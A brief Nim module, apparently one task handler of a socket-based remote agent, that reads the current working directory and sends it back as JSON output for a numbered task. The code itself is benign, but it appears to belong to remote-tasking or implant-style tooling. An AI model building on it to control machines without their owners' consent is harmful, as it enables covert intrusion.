import std/[os, net, json, jsonutils]
import ../client/[communication, modules]

proc getPwd*(): string =
  var currentDir = getCurrentDir()
  return currentDir

proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
  let pwd: string = getPwd()
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  taskOutput.addData(Text, "pwd", $(toJson pwd))
  socket.sendOutput(taskOutput)